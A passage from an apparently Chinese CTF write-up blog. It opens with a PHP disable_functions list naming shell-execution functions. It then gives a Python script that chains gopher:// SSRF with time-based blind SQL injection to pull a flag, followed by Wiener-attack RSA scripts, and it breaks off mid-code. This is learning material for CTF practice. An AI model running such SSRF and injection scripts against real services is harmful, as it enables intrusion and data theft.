<p>error_log,mb_send_mail,imap_mail,system,unlink,rmdir,shell_exec,exec,putenv,mail,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,passthru,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,imagecolormatch,fopen,copy,rename,readlink,tmpfile,tempnam,touch,link,file,ftp_connect,ftp_ssl_connect</p>
</blockquote>
<p>发现<code>readfile</code>没有被过滤</p>
<p><img src="http://img.npfs06.top/20210511202732.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$a</span> = preg_match(<span class="string">&quot;/file|dict/i&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>类似与之前的虎符慢慢做，gopher进行ssrf本地admin.php，然后时间盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;,&quot;</span> + string.ascii_lowercase + string.digits + string.ascii_uppercase</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;,@&quot;</span> + string.ascii_letters</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">post</span>):</span></span><br><span class="line">    post_len = <span class="built_in">len</span>(post)</span><br><span class="line">    post = parse.quote(post)</span><br><span class="line">    exp = <span class="string">f&quot;gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AConnection%3A%20close%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%20<span class="subst">&#123;post_len&#125;</span>%0D%0A%0D%0A<span class="subst">&#123;post&#125;</span>&quot;</span></span><br><span class="line">    exp = exp.replace(<span class="string">&quot;%&quot;</span>, <span class="string">&quot;%25&quot;</span>)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">f&quot;http://121.36.147.29:20001/?url=<span class="subst">&#123;exp&#125;</span>&quot;</span></span><br><span class="line">    start_time  = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.3</span></span><br><span class="line">    stop_time  = time.time()</span><br><span class="line">    <span class="keyword">return</span> stop_time - start_time</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        post = <span class="string">f&quot;poc=mid((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;c&#125;</span>&#x27; and sleep(1) &quot;</span></span><br><span class="line">        t = send(post)</span><br><span class="line">        <span class="comment"># print(i,c,t)</span></span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">0.3</span>:</span><br><span class="line">            result += c</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210511212701.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="GoOSS"><a href="#GoOSS" class="headerlink" title="GoOSS"></a>GoOSS</h2><p><img src="http://img.npfs06.top/20210511190809.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210511190649.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p><img src="http://img.npfs06.top/20210510184557.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64  -&gt; ascii</p>
<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p><img src="http://img.npfs06.top/20210510190916.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>用到的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//RSAwienerHacker.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != -<span class="number">1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    N = <span class="number">143197135363873763765271313889482832065495214476988244056602939316096558604072987605784826977177132590941852043292009336108553058140643889603639640376907419560005800390316898478577088950660088975625569277320455499051275696998681590010122458979436183639691126624402025651761740265817600604313205276368201637427</span></span><br><span class="line">    e = <span class="number">119393861845960762048898683511487799317851579948448252137466961581627352921253771151013287722073113635185303441785456596647011121862839187775715967164165508224247084850825422778997956746102517068390036859477146822952441831345548850161988935112627527366840944972449468661697184646139623527967901314485800416727</span></span><br><span class="line">    hacked_d = hack_RSA(e, N)</span><br><span class="line">    print(<span class="string">&quot;d =&quot;</span>, hacked_d)</span><br><span class="line">    c=<span class="number">58703794202217708947284241025731347400180247075968200121227051434588274043273799724484183411072837136505848853313100468119277511144235171654313035776616454960333999039452491921144841080778960041199884823368775400603713982137807991048133794452060951251851183850000091036462977949122345066992308292574341196418</span></span><br><span class="line">    m=<span class="built_in">pow</span>(c,hacked_d,N)</span><br><span class="line">    print(libnum.n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//RSAvulnerableKeyGenerator.py</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 14, 2011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: pablocelayes</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This module generates RSA-keys which are vulnerable to</span></span><br><span class="line"><span class="string">the Wiener continued fraction attack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(see RSAfracCont.pdf)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The RSA keys are obtained as follows:</span></span><br><span class="line"><span class="string">1. Choose two prime numbers p and q</span></span><br><span class="line"><span class="string">2. Compute n=pq</span></span><br><span class="line"><span class="string">3. Compute phi(n)=(p-1)(q-1)</span></span><br><span class="line"><span class="string">4. Choose e coprime to phi(n) such that gcd(e,n)=1</span></span><br><span class="line"><span class="string">5. Compute d = e^(-1) mod (phi(n))</span></span><br><span class="line"><span class="string">6. e is the publickey; n is also made public (determines the block size); d is the privatekey</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encryption is as follows:</span></span><br><span class="line"><span class="string">1. Size of data to be encrypted must be less than n</span></span><br><span class="line"><span class="string">2. ciphertext=pow(plaintext,publickey,n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Decryption is as follows:</span></span><br><span class="line"><span class="string">1. Size of data to be decrypted must be less than n</span></span><br><span class="line"><span class="string">2. plaintext=pow(ciphertext,privatekey,n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RSA-keys are Wiener-vulnerable if d &lt; (n^(1/4))/sqrt(6)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random, MillerRabin, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPrimePair</span>(<span class="params">bits=<span class="number">512</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    genera un par de primos p , q con </span></span><br><span class="line"><span class="string">        p de nbits y</span></span><br><span class="line"><span class="string">        p &lt; q &lt; 2p</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> bits%<span class="number">4</span>==<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    p = MillerRabin.gen_prime(bits)</span><br><span class="line">    q = MillerRabin.gen_prime_range(p+<span class="number">1</span>, <span class="number">2</span>*p)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateKeys</span>(<span class="params">nbits=<span class="number">1024</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Generates a key pair</span></span><br><span class="line"><span class="string">        public = (e,n)</span></span><br><span class="line"><span class="string">        private = d </span></span><br><span class="line"><span class="string">    such that</span></span><br><span class="line"><span class="string">        n is nbits long</span></span><br><span class="line"><span class="string">        (e,n) is vulnerable to the Wiener Continued Fraction Attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># nbits &gt;= 1024 is recommended</span></span><br><span class="line">    <span class="keyword">assert</span> nbits%<span class="number">4</span>==<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    p,q = getPrimePair(nbits//<span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    phi = Arithmetic.totient(p, q)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># generate a d such that:</span></span><br><span class="line">    <span class="comment">#     (d,n) = 1</span></span><br><span class="line">    <span class="comment">#    36d^4 &lt; n</span></span><br><span class="line">    good_d = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> good_d:</span><br><span class="line">        d = random.getrandbits(nbits//<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> (Arithmetic.gcd(d,phi) == <span class="number">1</span> <span class="keyword">and</span> <span class="number">36</span>*<span class="built_in">pow</span>(d,<span class="number">4</span>) &lt; n):</span><br><span class="line">            good_d = <span class="literal">True</span></span><br><span class="line">                    </span><br><span class="line">    e = Arithmetic.modInverse(d,phi)</span><br><span class="line">    <span class="keyword">return</span> e,n,d</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;hey&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e,n,d = generateKeys()</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Clave Publica:&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;e =&quot;</span>)</span><br><span class="line">        print(e)</span><br><span class="line">        print(<span class="string">&quot;n =&quot;</span>)</span><br><span class="line">        print(n)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Clave Privada:&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;d =&quot;</span>)</span><br><span class="line">        print(d)</span><br><span class="line">        print(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//MillerRabin.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin_pass</span>(<span class="params">a, s, d, n</span>):</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">	n is an odd number with</span></span><br><span class="line"><span class="string">		n-1 = (2^s)d, and d odd</span></span><br><span class="line"><span class="string">		and a is the base: 1 &lt; a &lt; n-1</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	returns True iff n passes the MillerRabinTest for a </span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	a_to_power = <span class="built_in">pow</span>(a, d, n)</span><br><span class="line">	i=<span class="number">0</span></span><br><span class="line">	<span class="comment">#Invariant: a_to_power = a^(d*2^i) mod n</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># we test whether (a^d) = 1 mod n</span></span><br><span class="line">	<span class="keyword">if</span> a_to_power == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># we test whether a^(d*2^i) = n-1 mod n</span></span><br><span class="line">	<span class="comment"># 	for 0&lt;=i&lt;=s-1</span></span><br><span class="line">	<span class="keyword">while</span>(i &lt; s-<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> a_to_power == n - <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">		a_to_power = (a_to_power * a_to_power) % n</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># we reach here if the test failed until i=s-2	</span></span><br><span class="line">	<span class="keyword">return</span> a_to_power == n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span>(<span class="params">n</span>):</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Applies the MillerRabin Test to n (odd)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	returns True iff n passes the MillerRabinTest for</span></span><br><span class="line"><span class="string">	K random bases</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	<span class="comment">#Compute s and d such that n-1 = (2^s)d, with d odd</span></span><br><span class="line">	d = n-<span class="number">1</span></span><br><span class="line">	s = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> d%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">		d &gt;&gt;= <span class="number">1</span></span><br><span class="line">		s+=<span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#Applies the test K times</span></span><br><span class="line">	<span class="comment">#The probability of a false positive is less than (1/4)^K</span></span><br><span class="line">	K = <span class="number">20</span></span><br><span class="line">	</span><br><span class="line">	i=<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(i&lt;=K):</span><br><span class="line">	<span class="comment"># 1 &lt; a &lt; n-1</span></span><br><span class="line">		a = random.randrange(<span class="number">2</span>,n-<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> miller_rabin_pass(a, s, d, n):</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits</span>):</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Generates a prime of b bits using the</span></span><br><span class="line"><span class="string">	miller_rabin_test</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			p = random.getrandbits(nbits)</span><br><span class="line">			<span class="comment">#force p to have nbits and be odd</span></span><br><span class="line">			p |= <span class="number">2</span>**nbits | <span class="number">1</span></span><br><span class="line">			<span class="keyword">if</span> miller_rabin(p):</span><br><span class="line">				<span class="keyword">return</span> p</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime_range</span>(<span class="params">start, stop</span>):</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Generates a prime within the given range</span></span><br><span class="line"><span class="string">	using the miller_rabin_test</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		p = random.randrange(start,stop-<span class="number">1</span>)</span><br><span class="line">		p |= <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> miller_rabin(p):</span><br><span class="line">				<span class="keyword">return</span> p</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;test&quot;</span>:</span><br><span class="line">		n = sys.argv[<span class="number">2</span>]</span><br><span class="line">		<span class="built_in">print</span> (miller_rabin(n) <span class="keyword">and</span> <span class="string">&quot;PRIME&quot;</span> <span class="keyword">or</span> <span class="string">&quot;COMPOSITE&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;genprime&quot;</span>:</span><br><span class="line">		nbits = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">		print(gen_prime(nbits))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//ContinuedFractions.py</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 14, 2011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: pablocelayes</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_contfrac</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a = x//y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x,y = y,x-a*y</span><br><span class="line">        a = x//y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> efficient method that calculates convergents on-the-go, without doing partial quotients first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_contfrac</span>(<span class="params">frac</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contfrac_to_rational</span> (<span class="params">frac</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">     to an x/y rational.</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>,-<span class="built_in">len</span>(frac)-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_]*num+denom, num</span><br><span class="line">    <span class="keyword">return</span> (num,denom)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Verify that the basic continued-fraction manipulation stuff works.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    testnums = [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">2</span>), (<span class="number">5</span>, <span class="number">15</span>), (<span class="number">27</span>, <span class="number">73</span>), (<span class="number">73</span>, <span class="number">27</span>)]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> testnums:</span><br><span class="line">        (num, denom) = r</span><br><span class="line">        print(<span class="string">&#x27;rational number:&#x27;</span>)</span><br><span class="line">        print(r)</span><br><span class="line"></span><br><span class="line">        contfrac = rational_to_contfrac (num, denom)</span><br><span class="line">        print(<span class="string">&#x27;continued fraction:&#x27;</span>)</span><br><span class="line">        print(contfrac)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;convergents:&#x27;</span>)</span><br><span class="line">        print(convergents_from_contfrac(contfrac))</span><br><span class="line">        print(<span class="string">&#x27;***********************************&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test1()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//Arithmetic.py</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 22, 2011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: pablocelayes</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modInverse</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    d such that de = 1 (mod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">totient</span>(<span class="params">p,q</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the totient of pq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitlength</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the bitlength of x</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> x &gt;= <span 